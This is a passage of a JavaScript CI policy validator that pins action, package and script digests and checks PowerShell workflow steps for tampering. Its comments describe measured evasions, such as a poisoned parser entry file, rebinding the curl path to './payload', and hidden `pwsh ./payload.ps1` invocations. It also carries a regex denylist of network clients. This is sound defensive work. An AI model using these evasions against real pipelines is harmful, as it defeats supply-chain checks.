import { createHash } from 'node:crypto';
import { lstatSync, readFileSync, readdirSync, realpathSync } from 'node:fs';
import { createRequire } from 'node:module';
import { basename, dirname, join, resolve, sep } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

// The YAML parser is deliberately *not* imported here. Round 44, and the
// finding that refuted this pull request's own stated soundness argument.
//
// The policy job was justified by "npm ci --ignore-scripts unpacks the
// dependency tree without executing any of it, so no package code has run when
// the validator is invoked". That is true right up to the moment the validator
// starts, and false immediately afterwards: a static `import ... from 'yaml'`
// evaluates the installed package before a single line of this file runs.
// --ignore-scripts suppresses lifecycle scripts; it says nothing about what a
// later Node process imports.
//
// Measured, with the parser's entry file prefixed by one statement:
//
//   process.exit(0)                        -> validator exits 0, validating nothing
//   print a pass line, then process.exit(0) -> validator exits 0 and forges the
//                                              evidence, digest and all
//
// The step captures only $LASTEXITCODE, so both are a green policy job over an
// unvalidated repository. So the parser is loaded rather than imported: its
// bytes on disk are folded into one digest and checked before any of it is
// evaluated, which is the ordering the job split claimed and did not have.

const ACTIONS = Object.freeze({
  checkout: Object.freeze({
    reference: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
    release: 'v7.0.1',
  }),
  // Retained without a current use: no job runs this action now that the lint
  // job acquires its own Node distribution, but #20 still names the pin and
  // T1B reintroduces the role, so the reviewed identity stays under review
  // rather than being dropped and re-established later.
  setupNode: Object.freeze({
    reference: 'actions/setup-node@820762786026740c76f36085b0efc47a31fe5020',
    release: 'v7.0.0',
  }),
  uploadArtifact: Object.freeze({
    reference: 'actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a',
    release: 'v7.0.1',
  }),
});

// Reviewed defaults are deliberately separate from authored inputs. Any pin
// update must review and replace this complete table atomically with the role
// policy and negative fixtures below.
export const REVIEWED_ACTION_DEFAULTS = Object.freeze({
  checkout: Object.freeze({
    manifestSha256: 'd59219cb79590abdb877deaa14e3b65a00c05318bf5a6f3b989b9162b5d08c35',
    runtime: 'node24',
    omitted: Object.freeze({
      'ssh-key': Object.freeze({ default: '', rationale: 'SSH authentication is prohibited; HTTPS token checkout is explicit.' }),
      'ssh-known-hosts': Object.freeze({ default: '', rationale: 'No SSH transport is used.' }),
      'ssh-strict': Object.freeze({ default: true, rationale: 'Reviewed but not applicable without SSH.' }),
      'ssh-user': Object.freeze({ default: 'git', rationale: 'Reviewed but not applicable without SSH.' }),
      path: Object.freeze({ default: '', rationale: 'Checkout remains at the repository workspace root.' }),
      filter: Object.freeze({ default: null, rationale: 'Partial clone is prohibited.' }),
      'sparse-checkout': Object.freeze({ default: null, rationale: 'Sparse checkout is prohibited.' }),
      'sparse-checkout-cone-mode': Object.freeze({ default: true, rationale: 'Reviewed but not applicable without sparse checkout.' }),
      'github-server-url': Object.freeze({ default: '${{ github.server_url }}', rationale: 'The repository context selects the server.' }),
    }),
  }),
  setupNode: Object.freeze({
    manifestSha256: '5d765941ab5d8bef27f08e81b0b041cdb2df2050ea0261dc925d157a2bafbd2b',
    runtime: 'node24',
    omitted: Object.freeze({
      'node-version-file': Object.freeze({ default: '', rationale: 'The exact Node patch is authored directly.' }),
      architecture: Object.freeze({ default: '', rationale: 'The hosted runner architecture is used.' }),
      'registry-url': Object.freeze({ default: '', rationale: 'No registry authentication file is created.' }),
      scope: Object.freeze({ default: '', rationale: 'No registry scope is configured.' }),
      cache: Object.freeze({ default: '', rationale: 'Dependency caching is prohibited for this frozen install.' }),
      'cache-dependency-path': Object.freeze({ default: '', rationale: 'Caching is disabled.' }),
      mirror: Object.freeze({ default: '', rationale: 'Only the official Node distribution source is permitted.' }),
      'mirror-token': Object.freeze({ default: '', rationale: 'No mirror is configured.' }),
    }),
  }),
  uploadArtifact: Object.freeze({
    manifestSha256: 'c5979822866a72362e609844b6ebe77d4b7e759af68cc1c2c425dcf51481fab4',
    runtime: 'node24',
    omitted: Object.freeze({
      archive: Object.freeze({ default: true, rationale: 'The reviewed default ZIP artifact representation is required.' }),
    }),
  }),
});

const CHECKOUT_INPUTS = Object.freeze({
  repository: '${{ github.repository }}',
  ref: '${{ github.sha }}',
  token: '${{ github.token }}',
  'persist-credentials': false,
  'fetch-depth': 1,
  'fetch-tags': false,
  'show-progress': false,
  lfs: false,
  submodules: false,
  clean: true,
  'set-safe-directory': true,
  'allow-unsafe-pr-checkout': false,
});

const UPLOAD_INPUTS = Object.freeze({
  name: 'style-guide-artifacts',
  path: 'copilot-instructions.md\nterraform.instructions.md\nSTYLE_GUIDE_CHAT.md\nSTYLE_GUIDE_FULL.md\n',
  'if-no-files-found': 'error',
  'retention-days': 7,
  'compression-level': 6,
  overwrite: false,
  'include-hidden-files': false,
});

const EXPECTED_TRIGGER = Object.freeze({
  push: Object.freeze({ branches: Object.freeze(['main']) }),
  pull_request: Object.freeze({ branches: Object.freeze(['main']) }),
});

// The Markdown workflow hashes package.json and package-lock.json only against
// themselves, which proves npm ci left them alone but establishes the files
// under review as their own baseline. A change that edits both together — for
// example redefining lint:md as a no-op or swapping the yaml parser — survives
// that check. These reviewed values are the independent baseline, so the
// scripts the workflow runs and the graph it installs are fixed at review time.
const REVIEWED_PACKAGE_DIGESTS = Object.freeze({
  'package.json': 'e206cdb3562f0397e8eed7fb2c2586269a1f5335cdff2906da8d5e070426321e',
  'package-lock.json': '277f7168ab3a4f1f7a2565de13191d64b1572e7cb92b67b0972b3242bd4de062',
});

const REVIEWED_SCRIPTS = Object.freeze({
  'lint:md': 'cd ../.. && markdownlint-cli2 "**/*.md" "#node_modules" "#.github/workflows/node_modules" --config .github/workflows/.markdownlint.jsonc',
  'lint:md:nested': 'node lint-nested-markdown.js',
  prepare: 'cd ../.. && husky || true',
});

const REVIEWED_DEV_DEPENDENCIES = Object.freeze({
  glob: '^10.3.10',
  husky: '^9.1.7',
  'markdown-it': '^14.0.0',
  markdownlint: '^0.40.0',
  'markdownlint-cli2': '^0.20.0',
  yaml: '2.9.0',
});

// The validator parses policy YAML with this exact package, so its resolved
// identity is part of the policy rather than an incidental transitive detail.
const REVIEWED_PARSER = Object.freeze({
  version: '2.9.0',
  resolved: 'https://registry.npmjs.org/yaml/-/yaml-2.9.0.tgz',
  integrity: 'sha512-2AvhNX3mb8zd6Zy7INTtSpl1F15HW6Wnqj0srWlkKLcpYl/gMIMJiyuGq2KeI2YFxUPjdlB+3Lc10seMLtL4cA==',
});

// The three fields above describe what npm was told to install. They are
// checked by validatePackagePolicy, which runs inside this process -- long
// after a static import would have evaluated whatever is actually on disk. A
// lockfile assertion cannot defend the thing that runs before it, so the bytes
// get their own gate, taken over the installed package directory and compared
// before the parser is loaded.
//
// The whole directory rather than the entry file: which files the loader
// reaches is a property of the package's own exports map, and pinning only the
// files reachable today would be a list to be one entry short of. yaml declares
// no dependencies, so this directory is the entire parser.
const REVIEWED_PARSER_TREE_SHA256 = 'ce50e3ffc11ca6ee6cbcde528ef7a0cca908241ee3394d8e01d9e7a813bdd53e';

// Naming three cmdlets left every other client open, including Invoke-RestMethod
// and the .NET networking types. That gap was written when a step held a
// contents-write token; no step holds one now, but the reason to close it did
// not depend on the token -- the governed steps run repository-controlled code
// and none of them performs network I/O, so the denylist covers the client
// surface rather than a sample of it. Deliberately no /g flag: reused with test().
// The complete static-call surface of both reviewed acquire steps, measured
// rather than guessed: markdownlint.acquire makes five distinct calls and
// verify.acquire three, and this is their union. Lower-cased because
// PowerShell member lookup is case-insensitive.
// The invocation allowlist approves a call because its target is *spelled*
// $strGitPath, $strCurlPath or $strTarPath. Spelling is not provenance: measured
// with the digest re-baselined, replacing the constant setup with
// $strCurlPath = './payload' was accepted, as was dropping -Option Constant, as
// was leaving the binding intact and rebinding the resolution source itself --
// a variant not reported, and the reason this is pinned at both ends rather
// than only at the binding. Each reviewed target is therefore tied to the exact
// constant binding and the exact absolute paths it is reviewed to resolve from.
const REVIEWED_COMMAND_BINDINGS = Object.freeze({
  strGitPath: { source: 'strResolvedGit', paths: ['/usr/bin/git', '/bin/git'] },
  strCurlPath: { source: 'strResolvedCurl', paths: ['/usr/bin/curl', '/bin/curl'] },
  strTarPath: { source: 'strResolvedTar', paths: ['/usr/bin/tar', '/bin/tar'] },
});
// The bare-cmdlet surface, allowlisted for the same reason as the static one:
// the static allowlist closed [System.IO.File]::Copy and left Copy-Item open,
// because a cmdlet is neither a static call nor an & / dot invocation. Measured
// from the *projection* of both acquire steps, not the raw text -- the raw text
// also contains Invoke-WebRequest, inside the comment explaining why curl is
// pinned, and allowlisting from it would have admitted a network client.
const REVIEWED_ACQUIRE_CMDLETS = new Set([
  'get-filehash',
  'new-variable',
  'select-object',
  'test-path',
  'where-object',
  'write-host',
]);
// Round 55. The complete command-position surface of all three acquire steps,
// read off their projections. Native commands reach this step only through the
// reviewed `& $strGitPath` / `& $strCurlPath` / `& $strTarPath` invocations,
// which are call-operator forms and so are not command-position tokens at all
// -- which is exactly why a *bare* printf or chmod was invisible.
const REVIEWED_ACQUIRE_COMMANDS = Object.freeze([
  'Get-FileHash', 'New-Variable', 'Select-Object', 'Test-Path', 'Where-Object',
  'Write-Host', 'if', 'throw',
]);
const REVIEWED_ACQUIRE_STATIC_CALLS = new Set([
  'system.io.directory::createdirectory',
  'system.io.directory::enumeratefilesystementries',
  'system.io.file::exists',
  'system.io.path::combine',
  'string::isnullorempty',
]);
const NETWORK_CLIENT =/\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|irm|Start-BitsTransfer|Net\.WebClient|WebClient|HttpClient|WebRequest|TcpClient|UdpClient|HttpListener|Socket)\b|System\.Net\./iu;


// The Markdown governed steps capture each phase status into a variable and
// defer the failure decision to a final check. The structural assertions below
// count direct "$intPolicyExit =" assignments, which a rewrite can satisfy while
// still zeroing the captured value -- Set-Variable -Name intPolicyExit -Value 0
// changes the variable without matching the assignment syntax being counted.
// Enumerating the indirect writers (Set-Variable, New-Variable, the Variable:
// provider, [ref] handles) is the same losing shape, so the whole reviewed
// script is pinned instead: any edit at all changes this digest.
//
// There are two of them because there are now two jobs. The validator and the
// linters each read something the other can write -- the extracted toolchain in
// one direction, the rule configuration and the nested-fence helper in the
// other -- so whichever ran second in a single job was exposed to the first.
// Both orders were tried here and each one's fix was the other one's defect.
// Separate jobs are separate runners with separate filesystems, which removes
// the choice rather than making it.
const REVIEWED_POLICY_STEP_DIGEST = '0014b712b89fd6ae059238ee0fcdb6a5bd2f528b6659da9bafd36ea07f6119d0';
const REVIEWED_LINT_STEP_DIGEST = 'acde5c2450673e744a8acc058eeb214d9fcf1de7c9677c4639880a9f76ab9f72';

// Both governed steps have to establish the same supply position before they
// diverge: the pinned toolchain, the reviewed package metadata, and npm's
// configuration sources. Splitting one step into two created a second place for
// that to be written, and therefore a second place for it to drift -- so the
// prelude is required to be byte-identical rather than merely to satisfy the
// same fragment list twice. This anchor is its last statement; everything from
// the start of each step through the end of it must match exactly.
const MARKDOWN_PRELUDE_END = "if ($strGlobalConfigDirectory -cne '/etc') {\n" +
  "    throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n" +
  '}\n';

// The credential-cleanup step's assertions all test for the presence of a
// sequence, and presence is not execution: an inserted early exit satisfies
// every one of them while returning before either credential check runs. This
// pins the whole script for the same reason the other two substantive steps
// are pinned. It is a backstop and not a substitute: the assertions it stands
// behind are named individually so a re-baseline cannot quietly drop them.
const REVIEWED_CREDENTIAL_STEP_DIGEST = 'e94b265f97f20d46df3bafcee77f546463f650c2d537a114c9f276f28707d3ad';

// The verify step runs repository-controlled code and then draws a conclusion
// from Git probes. Its required fragments and their ordering are asserted
// individually below, but an inserted early exit satisfies every one of them
// while skipping the probes entirely. The same backstop the Markdown step and
// the former push step carry applies here for the same reason.
const REVIEWED_VERIFY_STEP_DIGEST = 'f0db2a83eeb215e80c2ff6737e72dd8cc4aa51f04a9c037524d261eec57ddc10';

// Both jobs that run repository-controlled code now acquire their own revision
// instead of using an action to do it, so neither contains a process holding
// ACTIONS_RUNTIME_TOKEN. Each acquire step is held to the standard the action
// it replaced was held to: substantive assertions named individually, and the
// whole script pinned behind them.
const BUILD_ACQUIRE = Object.freeze({
  name: 'Acquire triggering revision without an action',
  classifiedStatuses: 5,
  networkClients: 0,
  // The build acquire step needs a tail constraint for the same reason the
  // Markdown one does, and its absence was worse: a statement appended after
  // the revision check can overwrite the generator from another checked-out
  // file and then set the advisory assume-unchanged bit on it. The verify
  // step takes its worktree baseline and its Git control-surface digest
  // afterwards, so the mutation sits inside the baseline and the comparison
  // reports no drift over a generator that was replaced.
  tail: '& $strGitPath init --quiet .\nif ($LASTEXITCODE -ne 0) { throw "acquire: git init exited $LASTEXITCODE" }\n& $strGitPath remote add origin "$strServerUrl/$strRepository"\nif ($LASTEXITCODE -ne 0) { throw "acquire: git remote add exited $LASTEXITCODE" }\n# Fetching the commit itself, not a ref that names it. No credential\n# is supplied and none is configured, so nothing is persisted for the\n# next step to have to clean up.\n& $strGitPath fetch --depth 1 --no-tags --no-recurse-submodules origin $strSha\nif ($LASTEXITCODE -ne 0) { throw "acquire: git fetch exited $LASTEXITCODE" }\n& $strGitPath checkout --quiet --detach FETCH_HEAD\nif ($LASTEXITCODE -ne 0) { throw "acquire: git checkout exited $LASTEXITCODE" }\n$strHead = (& $strGitPath rev-parse HEAD).Trim()\nif ($LASTEXITCODE -ne 0 -or $strHead -cne $strSha) {\n    throw \'acquire: the checked out revision is not the triggering revision\'\n}\nWrite-Host "acquire: anonymous shallow checkout of $strSha"',
  digest: '201af2ff2fad27dcb14f4c84867c853f3528ca48ff1aaf865c6c31039c82dd64',
});

// The Markdown job additionally brings the Node distribution setup-node used to
// supply. The archive and its digest are reviewed constants rather than
// whatever the server returns, which is a stronger supply assertion than the
// action carried: nothing in this repository ever verified what setup-node
// downloaded. The linux-x64 archive digest below was checked against the
// published SHASUMS256.txt for v24.18.1.
const REVIEWED_NODE_ARCHIVE_SHA256 = 'D6C664DF3F3F61458E8C277585571328522D705166723A7C7823A9253A4D15A0';
const MARKDOWN_ACQUIRE = Object.freeze({
  name: 'Acquire triggering revision and pinned toolchain without an action',
  classifiedStatuses: 7,
  digest: 'ede69b239684d6a0bf393a331e7eceab1725fbcae94ed2ede287cea4d51fe832',
  networkClients: 1,
  extraSequences: Object.freeze([
    ['the exact reviewed Node archive',
      "$strNodeUrl = 'https://nodejs.org/dist/v24.18.1/node-v24.18.1-linux-x64.tar.xz'"],
    ['the reviewed Node archive digest',
      `$strReviewedNodeSha256 = '${REVIEWED_NODE_ARCHIVE_SHA256}'`],
    // One contiguous block rather than three separate presence checks. Naming
    // the download, the comparison, and the extraction individually says each
    // is present and says nothing about what sits between them -- and what
    // sits between them is the whole question, because a statement inserted
    // after the comparison and before the extraction replaces the archive that
    // was just verified, and one inserted after the extraction replaces the
    // binaries that came out of it. Requiring the region to be exactly this
    // leaves no position for either.
    ['the download, its verification, and the extraction as one uninterrupted block',
      '$strNodeUrl = \'https://nodejs.org/dist/v24.18.1/node-v24.18.1-linux-x64.tar.xz\'\n$strReviewedNodeSha256 = \'D6C664DF3F3F61458E8C277585571328522D705166723A7C7823A9253A4D15A0\'\n$strNodeRoot = [System.IO.Path]::Combine($env:RUNNER_TEMP, \'node24\')\n$strArchivePath = [System.IO.Path]::Combine($env:RUNNER_TEMP, \'node24.tar.xz\')\n& $strCurlPath --silent --show-error --fail --location --proto \'=https\' --tlsv1.2 --output $strArchivePath $strNodeUrl\nif ($LASTEXITCODE -ne 0) { throw "acquire: node download exited $LASTEXITCODE" }\n$strObservedNodeSha256 = (Get-FileHash -LiteralPath $strArchivePath -Algorithm SHA256).Hash\nif ($strObservedNodeSha256 -cne $strReviewedNodeSha256) {\n    throw \'acquire: the Node archive does not match the reviewed digest\'\n}\n[void][System.IO.Directory]::CreateDirectory($strNodeRoot)\n& $strTarPath -xJf $strArchivePath -C $strNodeRoot --strip-components=1\nif ($LASTEXITCODE -ne 0) { throw "acquire: node extraction exited $LASTEXITCODE" }\nWrite-Host "acquire: revision $strSha and the reviewed Node distribution"'],
  ]),
  // And the block is the end of the step, so nothing follows the extraction
  // at all. Without this the region above could sit anywhere and a later
  // statement could still overwrite the extracted tree from the checkout,
  // which needs no network and so is not caught by the count below.
  tail: '$strNodeUrl = \'https://nodejs.org/dist/v24.18.1/node-v24.18.1-linux-x64.tar.xz\'\n$strReviewedNodeSha256 = \'D6C664DF3F3F61458E8C277585571328522D705166723A7C7823A9253A4D15A0\'\n$strNodeRoot = [System.IO.Path]::Combine($env:RUNNER_TEMP, \'node24\')\n$strArchivePath = [System.IO.Path]::Combine($env:RUNNER_TEMP, \'node24.tar.xz\')\n& $strCurlPath --silent --show-error --fail --location --proto \'=https\' --tlsv1.2 --output $strArchivePath $strNodeUrl\nif ($LASTEXITCODE -ne 0) { throw "acquire: node download exited $LASTEXITCODE" }\n$strObservedNodeSha256 = (Get-FileHash -LiteralPath $strArchivePath -Algorithm SHA256).Hash\nif ($strObservedNodeSha256 -cne $strReviewedNodeSha256) {\n    throw \'acquire: the Node archive does not match the reviewed digest\'\n}\n[void][System.IO.Directory]::CreateDirectory($strNodeRoot)\n& $strTarPath -xJf $strArchivePath -C $strNodeRoot --strip-components=1\nif ($LASTEXITCODE -ne 0) { throw "acquire: node extraction exited $LASTEXITCODE" }\nWrite-Host "acquire: revision $strSha and the reviewed Node distribution"',
});

// The generator is repository-controlled code that the verify job executes. Its
// version marker is fixed, but a version marker constrains a string, not
// behaviour: the body can be rewritten completely while the marker stays put.
// Pinning the bytes makes any change to it a visible policy failure rather than
// a silent one. This is a review signal rather than a runtime gate -- build.yml
// does not run this validator, so what actually contains the generator at run
// time is the process boundary and the byte comparison in that step.
// Every occurrence of a reviewed guard, at the depth it was reviewed at. The
// array length is the count, so one list states both facts and they cannot
// drift apart.
//
// Checking only the first occurrence was the defect this replaced -- found by
// attacking my own rule rather than by report. With three copies of a guard and
// only the first one's depth checked, the third could be wrapped in
// `if ($false) { }`: the count stayed exact, the first stayed at its reviewed
// depth, and the mutation was accepted. The depths genuinely differ per
// occurrence (the temporary-path check sits at 2, 2 and 4), so a single
// expected depth could never have been right either.
function assertReviewedGuards(strCode, arrGuards, strCategory, fnMessage) {
  for (const [strFragment, arrDepths] of arrGuards) {
    const arrObserved = [];
    for (let at = strCode.indexOf(strFragment); at >= 0; at = strCode.indexOf(strFragment, at + 1)) {
      arrObserved.push(powerShellBraceDepthAt(strCode, at));
    }
    if (arrObserved.length !== arrDepths.length) {
      reject(strCategory, fnMessage('missing', strFragment));
    }
    for (let index = 0; index < arrDepths.length; index += 1) {
      if (arrObserved[index] !== arrDepths[index]) {
        reject(strCategory, fnMessage('unreachable', strFragment));
      }
    }
  }
}

// The governed Markdown steps' supply gates. Their `fragments` lists prove the
// text is present; nothing proved it could run, so wrapping a gate in
// `if ($false) { ... }` left the fragment intact and the gate dead -- measured
// accepted, and found by applying round 52's own lesson to the rules I had just
// written rather than waiting for it to be reported a third time.
//
// Every one of these sits at depth zero in both steps, which is the whole
// invariant: these gates are unconditional statements, so any enclosing block
// is by definition a change in whether they run. Fragments stop before their
// string literals because the projection blanks string content.
const REVIEWED_MARKDOWN_GATES = Object.freeze([
  ['if ($intNodeVersionExit -ne 0 -or $strNodeVersion -cne ', [0]],
  ['if ($intNpmVersionExit -ne 0 -or $strNpmVersion -cne ', [0]],
  ['if ($strPackageBefore -cne $strReviewedPackageHash -or $strLockBefore -cne $strReviewedLockHash) {', [0]],
  ['if ($strGlobalConfigDirectory -cne ', [0]],
  ['if ($strPackageAfterInstall -cne $strPackageBefore -or $strLockAfterInstall -cne $strLockBefore) {', [0]],
  ['if ($strPackageFinal -cne $strPackageBefore -or $strLockFinal -cne $strLockBefore) {', [0]],
]);
// The lint job additionally gates the two assets it is about to run.
const REVIEWED_LINT_GATES = Object.freeze([
  ['if ($strLintConfigHash -cne $strReviewedLintConfigHash -or $strLintHelperHash -cne $strReviewedLintHelperHash) {', [0]],
  ['if ($strLintConfigAfterInstall -cne $strReviewedLintConfigHash -or $strLintHelperAfterInstall -cne $strReviewedLintHelperHash) {', [0]],
]);

// The same treatment for build.verify, found by running the round-51 battery
// against it rather than waiting for a report. Its drift check was already
// pinned as a whole condition and survived; these four neighbours were not, and
// each was measured accepted with the verify step's digest re-baselined:
//
//   if ($false -and $arrOutside.Count -ne 0)                 -- the generator may
//     then change any path in the repository and the step still passes
//   $arrArtifacts -inotcontains $_                           -- artifact
//     membership case-folded, so a path differing only in case counts as one of
//     the four on a case-sensitive filesystem
//   Sort-Object without -CaseSensitive
//   if ($false -and $objDiff.ExitCode -ne 0 -and ... -ne 1)  -- the worst of the
//     four: with the sanity check gone, a git diff that *fails* has an exit code
//     that is neither 0 nor 1, falls past the drift branch, and reads as "no
//     drift"
//
// Whole conditions, for the reason recorded on the generator list below.
const REVIEWED_VERIFY_GUARDS = Object.freeze([
  ['if ($arrOutside.Count -ne 0) {', [1]],
  ['$arrArtifacts -cnotcontains $_', [2]],
  ['Sort-Object -CaseSensitive', [1, 2, 1]],
  ['if ($objDiff.ExitCode -ne 0 -and $objDiff.ExitCode -ne 1) {', [0]],
  // Case-sensitive comparisons that a sweep found unpinned: every -c operator
  // in all three files was case-folded and measured, and eleven folds were
  // accepted. Two of these compare *paths*, where case is attacker-chosen and
  // the filesystem is case-sensitive, so a control-surface path differing only
  // in case would pass the allowlist. The rest compare same-source hex digests,
  // where folding is a weakening rather than a demonstrated bypass -- pinned
  // because they are cheap to pin, not because an exploit was shown.
  // Stops before the throw message: the projection blanks string content, so a
  // fragment carrying one can never match it.
  ['if ($listObservedPaths -ccontains $strPath) { throw ', [2]],
  ['if ($AllowedPaths -cnotcontains $strPath) { throw ', [2]],
  ['if ([Convert]::ToBase64String($arrRecord) -cne [Convert]::ToBase64String($arrRoundTrip)) {', [2]],
  ['if ((Get-GitControlSurfaceDigest) -cne $strControlSurfaceBefore) {', [0]],
  ['if ((-not $objWorktreeAfter.ContainsKey($strPath)) -or ($objWorktreeAfter[$strPath] -cne $objWorktreeBefore[$strPath])) {', [1]],
]);

// Round 53, found by extending the reported finding to this file rather than by
// report. The guards above assert the deciding comparisons are present and
// reachable. None of them asserts that what those comparisons *read* is still
// the value the step measured -- so re-running the recorder immediately before
// its own gate satisfies every guard and compares the post-generator state
// against itself. Measured accepted with the step's digest re-baselined:
// repeating `$strControlSurfaceBefore = Get-GitControlSurfaceDigest` after the
// generator ran left the control-surface gate comparing a value to itself.
//
// Deliberately *not* modelled as the reported spelling class. In the generator
// and the Markdown steps a count existed and missed some spellings; here no
// count existed at all, and the plain spelling was accepted -- separately
// measured, so closing only `$local:` and `${...}` here would have been a rule
// that changes no outcome. Each of these is assigned exactly once in the
// reviewed step, counted in every spelling PowerShell accepts.
// Round 54 added listChanged. It is the accumulator the byte-level gate reads --
// `if ($listChanged.Count -ne 0)` -- and omitting it meant `$listChanged = @()`
// inserted immediately before that gate disabled the authoritative drift check
// while every other single-assignment assertion still passed. Measured
// accepted. The list is the set of names the guards read; it was one short.
const REVIEWED_VERIFY_SINGLE_ASSIGNMENT = Object.freeze([
  'arrArtifacts', 'arrOutside', 'arrRecord', 'arrRoundTrip', 'listChanged',
  'objDiff', 'objWorktreeAfter', 'objWorktreeBefore', 'strControlSurfaceBefore',
]);

// One variable write, in every spelling that reaches the same variable.
//
// Round 54, and three reported findings that are one defect: this pattern, the
// generator's Git-path count and the Markdown captured-status count all compared
// the *name* case-sensitively and recognised only a bare `=`. PowerShell does
// neither. Measured in PowerShell: `$STRGITPATH = 'git'` rebinds `$strGitPath`,
// `$INTPOLICYEXIT = 0` zeroes `$intPolicyExit`, and `$intPolicyExit -=
// $intPolicyExit` zeroes it without ever spelling a plain assignment. All three
// were accepted by the validator.
//
// So there is now one pattern and all three sites use it. Case-insensitive
// because PowerShell variable names are; every assignment operator it accepts,
// plus `++`/`--`, because each of them writes. `-eq` and friends cannot collide
// with this -- PowerShell comparisons are word operators and carry no `=`. A
// boundary follows the bare form so `$intPolicyExitOther` is a different name.
// Round 55, reported. PowerShell lets a backtick continue a statement across a
// newline, so `$strGitPath ` + newline + `= 'git'` is one assignment -- and
// every write pattern here allowed only spaces and tabs between the name and
// the operator, so the continued form was invisible and the canonical binding
// stayed the sole match. Measured accepted.
//
// Normalised rather than banned. Backtick continuations are zero on every
// governed projection today, so a ban would also have worked and would have
// broken the first legitimate one; folding the continuation away makes every
// pattern downstream correct regardless of how the line is broken.
//
// Round 56, reported: folding MORE than PowerShell folds is itself an evasion.
// A fold joins the next line onto this one, and a line that is no longer a line
// is invisible to every rule anchored at the start of one -- so `$null = 0` +
// backtick + a trailing SPACE + newline + `pwsh ./payload.ps1` hid a bare
// command that PowerShell really does run. Measured accepted.
//
// So this folds exactly what PowerShell folds, and no more. Measured with
// [scriptblock]::Create rather than assumed, because two of these four are not
// what the documentation's one-line summary suggests:
//
//   `  + newline   -> continues      ``   + newline -> does NOT (escaped tick)
//   `  + " " + NL  -> does NOT       ```  + newline -> continues
//
// Two rules, both measured: the backtick must be the FINAL character before the
// newline, and the run of backticks ending there must be ODD -- an even run is
// escaped-backtick pairs and continues nothing. The leading `(?<!`)` anchors the
// match at the start of a run so parity is counted over the whole run, and the
// pairs are preserved because they are literal content, not continuation.
function normalizeLineContinuations(strText) {
  return strText.replace(/(?<!`)((?:``)*)`\r?\n[ \t]*/gu, '$1 ');
}

function variableWritePattern(strName) {
  return new RegExp(
    `\\$(?:\\{(?:[A-Za-z_][A-Za-z0-9_]*:)?${strName}\\}` +
    `|(?:[A-Za-z_][A-Za-z0-9_]*:)?${strName}(?![A-Za-z0-9_]))` +
    // The increment and decrement forms need a boundary, and finding out why
    // cost a false rejection: `& $strGitPath --no-optional-locks` put `--`
    // directly after the variable, so an unbounded alternative read a command
    // flag as a decrement and reported the reviewed generator as broken. A real
    // decrement is not followed by an identifier character.
    `[ \\t]*(?:(?:\\+\\+|--)(?![A-Za-z0-9_])|(?:\\+|-|\\*|\\/|%|\\?\\?)?=(?!=))`,
    'giu');
}

// Counting *bindings* never sees a *mutation*. Round 54, reported: with the
// verify digest re-baselined, `$objWorktreeBefore.Clear()` followed by a refill
// from `$objWorktreeAfter` leaves every name assigned exactly once while both
// sides of the authoritative byte comparison describe the post-generator tree.
// Confirmed in PowerShell -- the gate reports no drift over a changed file.
//
// So the member surface of each measured collection is closed the way the
// generator's call operator is: enumerated from the reviewed step, by exact
// count. These are all reads except listChanged's two Add calls, which are how
// the accumulator is built. Clear, Remove, and an indexer write on either
// worktree map are absent from the reviewed step and therefore refused.
const REVIEWED_VERIFY_MEMBER_ACCESS = Object.freeze({
  arrArtifacts: Object.freeze({}),
  arrOutside: Object.freeze({ '.Count': 2 }),
  arrRecord: Object.freeze({ '.Length': 1 }),
  arrRoundTrip: Object.freeze({}),
  listChanged: Object.freeze({ '.Add': 2, '.Count': 1 }),
  objDiff: Object.freeze({ '.ExitCode': 4 }),
  objWorktreeAfter: Object.freeze({ '.ContainsKey': 1, '.Keys': 1, '[': 1 }),
  objWorktreeBefore: Object.freeze({ '.ContainsKey': 1, '.Keys': 1, '[': 1 }),
  strControlSurfaceBefore: Object.freeze({}),
});

// Round 55, and the member closure above is why it exists. That closure names
// the *variable* and inspects what follows it, so two things walked past it:
//
//   ${listChanged}.Clear()          reported -- the braced reference is the same
//                                  object and the scan only knew `$name.`
//   $x = $objWorktreeBefore        found by attacking my own rule; PowerShell
//   $x.Clear()                     copies the reference, so mutating the alias
//                                  mutates the measured map. Confirmed: the
//                                  gate reports NO DRIFT over a changed file.
//
// Both are the same shape as every defect this file keeps having -- the rule
// constrained a spelling of a name rather than the use of an object. So the
// count is over *every occurrence* of each protected name, in any spelling.
// An alias assignment is an extra occurrence; a braced access is an
// occurrence; a new read anywhere is an occurrence. Nothing can touch these
// values without changing a number here, which is a stronger statement than
// enumerating what may be done to them -- and the member closure stays,
// because it says which *use* is reviewed where this says only how many.
const REVIEWED_VERIFY_OCCURRENCES = Object.freeze({
  arrArtifacts: 4,
  arrOutside: 3,
  arrRecord: 7,
  arrRoundTrip: 2,
  listChanged: 5,
  objDiff: 5,
  objWorktreeAfter: 4,
  objWorktreeBefore: 4,
  strControlSurfaceBefore: 2,
});

// Any reference to a named variable, in every spelling PowerShell resolves to
// the same one. Case-insensitive for the reason the write pattern is.
function variableReferencePattern(strName) {
  return new RegExp(
    `\\$(?:\\{(?:[A-Za-z_][A-Za-z0-9_]*:)?${strName}\\}` +
    `|(?:[A-Za-z_][A-Za-z0-9_]*:)?${strName}(?![A-Za-z0-9_]))`,
    'giu');
}

// Round 55, reported. build.verify's command-position allowlist sees bare
// names and its invocation closure sees `&` and `.`; a static method call is
// neither, so `[System.Diagnostics.Process]::Start('pwsh', '-NoProfile -File
// ./payload.ps1')` was accepted and could run checkout-controlled code before
// the worktree baseline was recorded. Measured accepted.
//
// The Markdown steps answer this with a denylist of execution APIs. Here the
// surface is enumerated instead, because the step legitimately constructs a
// process -- Process::new and ProcessStartInfo::new are how it crosses the
// boundary into the generator -- so a ban naming Diagnostics.Process would
// have had to carve them out and would then have admitted Start anyway. Start
// is simply not in this list, and neither is anything else nobody reviewed.
//
// Round 56: the five generic and array constructions below were always in this
// step and were never checked -- the old pattern stopped at the first `]`, so it
// could not parse their type names and simply did not match them. Seven of the
// step's fifty static calls were therefore outside the allowlist entirely.
// Reviewed on being made visible: every one is a `::new` on a collection or
// array type, and none of them writes anything.
const REVIEWED_VERIFY_STATIC_CALLS = Object.freeze([
  'Convert::ToBase64String',
  'byte[]::new',
  'System.Array::Copy', 'System.Array::Reverse',
  'System.BitConverter::GetBytes', 'System.BitConverter::IsLittleEndian',
  'System.Collections.Generic.List[byte[]]::new',
